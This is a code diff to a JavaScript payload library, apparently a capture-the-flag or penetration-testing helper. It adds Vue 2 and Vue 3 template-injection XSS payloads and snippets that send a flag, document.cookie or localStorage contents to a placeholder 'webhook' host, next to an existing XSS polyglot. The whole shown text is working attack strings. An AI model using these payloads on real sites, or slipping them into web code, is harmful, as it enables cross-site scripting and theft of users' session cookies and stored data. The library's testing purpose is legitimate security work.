@@ -173,7 +173,20 @@ window.Payload.SQLi = {
 }
 
 window.Payload.XSS = {
-  polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  polyglot: value => "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+
+  Vue: {
+    vue2_1: value => "{{_c.constructor`alert()`()}}",
+    vue2_2: value => "<x/v-if=_c.constructor`alert()`()>",
+    vue3_1: value => "{{$emit.constructor`alert()`()}}",
+    vue3_2: value => "<component is=script text=alert()>"  
+  },
+
+  snippets: {
+    get_samesite_flag: value => "fetch('/flag').then(t=>t.text()).then(t=>location='https://webhook/?f='+encodeURIComponent(t))",
+    get_cookie_flag: value => "location='https://webhook/?f='+encodeURIComponent(document.cookie)",
+    get_storage_flag: value => "location='https://webhook/?f='+encodeURIComponent(localStorage.flag)"
+  }
 }
 
 window.Payload.LFI = {
